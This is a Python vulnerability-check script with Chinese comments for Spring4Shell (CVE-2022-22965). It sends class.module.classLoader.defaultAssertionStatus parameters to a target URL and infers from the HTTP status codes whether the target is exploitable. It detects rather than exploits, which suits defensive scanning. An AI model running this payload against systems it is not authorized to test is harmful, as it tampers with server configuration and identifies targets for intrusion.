# Author: wyunan

import argparse
import requests

Vul_Info = {  # 填写基本漏洞信息
    "vulId": "CVE-2022-22965 | CNVD-2022-23942",  # 漏洞编号
    "vulDate": "2022-04-01",  # 漏洞公开日期
    "vulName": "SpringCore远程命令执行漏洞",  # 漏洞名称
    "vulOrigin": "https://github.com/spring-projects/spring-framework/",  # 漏洞厂商
    "vulVersion": "Spring Framework 5.3.X < 5.3.18 & Spring Framework 5.2.X < 5.2.20",  # 漏洞版本
    "vulType": "远程命令执行",  # 漏洞类型
    "vulDesc": "Spring框架存在一个远程命令执行漏洞，由于Spring框架存在处理流程缺陷，攻击者可远程实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。", # 漏洞描述
    "vulFix": "升级至Spring Framework = 5.3.18；Spring Framework = 5.2.20",  # 修复描述

}

"""
检测方案：可以更改tomcat的默认断言配置(class.module.classLoader.defaultAssertionStatus=xxx)，一般业务的默认断言配置为false。更改该配置对业务影响较小，所以暂时采用此种检测方法
"""


def verify_poc(init_url, method):
    url = init_url
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"}
    # 该payload可以更改tomcat的默认断言配置，一般业务的默认断言配置为false。更改该配置对业务影响较小，所以暂时采用此种检测方法
    init_poc = "class.module.classLoader.defaultAssertionStatus=%s"
    # 正常情况下，如果业务存在该漏洞，默认断言配置值定位随意字符串时，业务侧会加载classloader去更改配置，但因为配置只有true和false，所以会更改报错返回400
    poc1 = init_poc % "any test"
    # 业务一般断言配置值默认是false
    poc2 = init_poc % "false"
    print(url)
    # 首先poc1会将断言配置更改为任意字符串“any test”，如果业务受漏洞影响，会去加载，但因为defaultAssertionStatus只有TRUE和FALSE，所以会加载失败，返回400。
    # 其次，poc2会将断言配置更改为FALSE，业务默认属性值。
    if method == "get":
        poc1_res = requests.get(url, params=poc1, timeout=3, allow_redirects=False, verify=False)
        poc2_res = requests.get(url, params=poc2, timeout=3, allow_redirects=False, verify=False)
    # 如果需要用post形式则选取如下
    elif method == "post":
        poc1_res = requests.post(url, headers=headers, data=poc1, timeout=3, allow_redirects=False, verify=False)
        poc2_res = requests.post(url, headers=headers, data=poc2, timeout=3, allow_redirects=False, verify=False)
    else:
        print("你输入的请求方式有误，请正确填写")
        return False

    if poc1_res.status_code == 400 and poc2_res.status_code == 200:
        return True
    else:
        return False


def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--url', help='target url', required=True)
    parser.add_argument('--method', help='http method', required=True)

    url_arg = parser.parse_args().url
    method_arg = parser.parse_args().method

    try:
        result = verify_poc(url_arg, method_arg)
        print(url_arg + "扫描完成")
        if result:
            print(url_arg + "存在SpringCore RCE漏洞")
        else:
            print(url_arg + "不存在SpringCore RCE漏洞")

    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
